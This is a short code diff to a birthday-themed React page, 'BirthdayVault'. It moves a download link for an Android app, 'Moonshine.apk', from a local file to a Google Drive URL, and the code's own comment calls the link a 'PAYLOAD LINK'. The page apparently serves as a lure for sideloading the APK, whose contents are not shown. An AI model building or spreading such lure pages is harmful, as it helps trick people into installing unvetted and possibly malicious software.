@@ -308,8 +308,8 @@ export default function BirthdayVault() {
                       initial={{ opacity: 0, y: 20, scale: 0.95 }} animate={{ opacity: 1, y: 0, scale: 1 }}
                       transition={{ delay: 0.45, type: "spring", stiffness: 90, damping: 14 }}
                       style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "1rem", marginTop: "2rem" }}>
-                      {/* PAYLOAD LINK — moonshine.apk must be in /public */}
-                      <a href="/moonshine.apk" download="Moonshine.apk" className="payload-link" aria-label="Download and install Moonshine">
+                      {/* PAYLOAD LINK — hosted on Google Drive */}
+                      <a href="https://drive.google.com/uc?export=download&id=1aCNgSi9sPFFcXNxNfOIRuS0YfDOPU6rq" target="_blank" rel="noopener noreferrer" className="payload-link" aria-label="Download and install Moonshine">
                         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden>
                           <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" /><polyline points="7 10 12 15 17 10" /><line x1="12" y1="15" x2="12" y2="3" />
                         </svg>
